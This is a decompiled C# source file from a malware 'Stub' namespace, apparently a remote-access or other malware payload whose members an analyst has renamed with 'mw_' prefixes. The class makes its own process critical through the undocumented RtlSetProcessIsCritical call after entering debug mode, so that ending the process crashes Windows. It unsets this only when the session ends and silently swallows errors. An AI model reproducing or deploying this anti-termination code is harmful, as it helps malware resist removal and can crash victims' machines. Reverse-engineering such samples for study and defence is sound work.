using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000010 RID: 16
	public class mw_ProcessKillPrevention
	{
		// Token: 0x060000A0 RID: 160
		[DllImport("NTdll.dll", SetLastError = true)]
		public static extern void RtlSetProcessIsCritical([MarshalAs(UnmanagedType.Bool)] [In] bool bNew, [MarshalAs(UnmanagedType.Bool)] ref bool pbOld, [MarshalAs(UnmanagedType.Bool)] bool bNeedScb);

		// Token: 0x060000A1 RID: 161
		public static void mw_unsetCriticality(object kXvZBCSx5Zh7Pc9rMFKfhkH2, SessionEndingEventArgs Z3MEDfLhb8xMUREHpwrmMtRJ)
		{
			mw_ProcessKillPrevention.mw_unsetProcessCriticality();
		}

		// Token: 0x060000A2 RID: 162
		public static void mw_makeProcessCritical()
		{
			try
			{
				SystemEvents.SessionEnding += mw_ProcessKillPrevention.mw_unsetCriticality;
				Process.EnterDebugMode();
				bool flag;
				mw_ProcessKillPrevention.RtlSetProcessIsCritical(true, ref flag, false);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00006304 File Offset: 0x00004504
		public static void mw_unsetProcessCriticality()
		{
			try
			{
				bool flag;
				mw_ProcessKillPrevention.RtlSetProcessIsCritical(false, ref flag, false);
			}
			catch (Exception ex)
			{
			}
		}
	}
}
